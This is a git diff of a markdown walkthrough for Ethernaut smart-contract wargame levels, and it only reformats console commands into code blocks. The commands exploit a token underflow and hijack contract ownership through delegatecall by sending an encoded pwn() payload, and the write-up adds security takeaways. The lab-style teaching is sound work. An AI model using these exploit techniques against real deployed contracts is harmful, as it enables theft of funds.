@@ -66,9 +66,11 @@ works:
 ![Explanation2](https://user-images.githubusercontent.com/61462365/76195124-e9701d80-61e7-11ea-8102-d60b79b4b89b.png)
 
 To solve this level we will perform an underflow by using the *transfer* function with the following two inputs: another address (than the one we are currently using , for example take other address on etherscan) and a number bigger than 20 (= amount of tokens given). We used the following command in the console:<br/>
-*await contract.balanceOf(player)* <br/>
-*await contract.transfer("0xab5801a7d398351b8be11c439e05c5b3259aec9b", 21)* <br/>
-*await contract.balanceOf(player)* <br/>
+```
+await contract.balanceOf(player) 
+await contract.transfer("0xab5801a7d398351b8be11c439e05c5b3259aec9b", 21)
+await contract.balanceOf(player)
+```
 
 ### Level 6 Delegation:
 Solidity documentation release 0.8.0 :<br/>
@@ -95,17 +97,19 @@ To solve this level we will use the pwn function in the context of the Delegatio
 
 or Since msg.sender, msg.data, msg.value are all persisted when executing a DelegateCall, all you had to do was pass malicious msg.data, i.e. the encoded payload of the pwn() function to get the property of the Delegationcontract you can directly in console do this :
 
-let payload = web3.eth.abi.encodeFunctionSignature({<br/>
-    name: 'pwn', <br/>
-    type: 'function',<br/>
-    inputs: []<br/>
-});<br/>
-<br/>
-await web3.eth.sendTransaction({<br/>
-    from: player,<br/>
-    to: instance,<br/>
-    data: payload<br/>
-});<br/>
+```
+let payload = web3.eth.abi.encodeFunctionSignature({
+    name: 'pwn',
+    type: 'function',
+    inputs: []
+});
+
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,
+    data: payload
+});
+```
 
 ### Key Security Takeaways <br/>
 Use the higher level call() function to inherit from libraries, especially when you <br/>
